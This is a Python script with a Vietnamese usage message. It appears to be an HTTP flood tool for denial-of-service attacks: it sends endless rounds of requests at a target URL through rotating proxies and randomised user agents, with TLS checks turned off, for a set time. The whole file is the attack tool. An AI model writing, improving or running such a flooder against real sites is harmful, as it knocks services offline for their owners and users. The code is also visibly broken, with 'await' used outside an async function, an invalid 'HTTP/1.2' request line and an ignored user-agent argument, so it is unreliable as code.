import asyncio
import aiohttp
import random
import string
import ssl
import urllib.parse
import sys

async def get_random_number_between(min_val, max_val):
    return random.randint(min_val, max_val)

async def random_string(length):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def build_request(parsed, uas):
    path = parsed.path
    if "[rand]" in path:
        path = path.replace("[rand]", await random_string(await get_random_number_between(5, 16)))

    headers = {
        "Host": parsed.hostname,
        "Referer": parsed.geturl(),
        "Origin": parsed.geturl(),
        "Accept": "*/*",
        "User-Agent": random.choice(uas),
        "Upgrade-Insecure-Requests": "1",
        "Accept-Encoding": "*",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "max-age=0",
        "Connection": "Keep-Alive"
    }

    request = f"{sys.argv[2]} {path} HTTP/1.2\r\n"
    for key, value in headers.items():
        request += f"{key}: {value}\r\n"

    return request + "\r\n"

async def worker(parsed, proxies, uas, rate):
    while True:
        proxy = random.choice(proxies)
        proxy_host, proxy_port = proxy.split(":")
        
        async with aiohttp.ClientSession() as session:
            conn = aiohttp.TCPConnector(ssl=False)
            async with session.request(method="CONNECT", url=parsed.hostname + ":443", proxy=proxy, connector=conn) as response:
                if response.status == 200:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE

                    for _ in range(rate):
                        try:
                            async with session.get(parsed.geturl(), headers={"User-Agent": random.choice(uas)}, proxy=proxy) as response:
                                await response.text()
                        except Exception as e:
                            pass

async def main():
    if len(sys.argv) != 8:
        print("Sai cú pháp! Vui lòng chạy file như sau:")
        print("python filename.py [URL] [Method GET/POST] [Process Count] [Time Limit (seconds)] [Rate] [Proxy File] [User Agent File]")
        return

    objective = sys.argv[1]
    process_count = int(sys.argv[3])
    time_limit = int(sys.argv[4])
    rate = int(sys.argv[5])

    try:
        with open(sys.argv[6], 'r') as file:
            proxies = file.read().splitlines()
    except FileNotFoundError:
        print('Check proxy.txt file.')
        sys.exit()

    try:
        with open('useragents.txt', 'r') as file:
            uas = file.read().splitlines()
    except FileNotFoundError:
        print('Check useragents.txt file.')
        sys.exit()

    parsed = urllib.parse.urlparse(objective)
    print(f"[*]{objective} time:{time_limit}")

    tasks = []
    for _ in range(process_count):
        task = asyncio.create_task(worker(parsed, proxies, uas, rate))
        tasks.append(task)

    await asyncio.sleep(time_limit)
    for task in tasks:
        task.cancel()

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
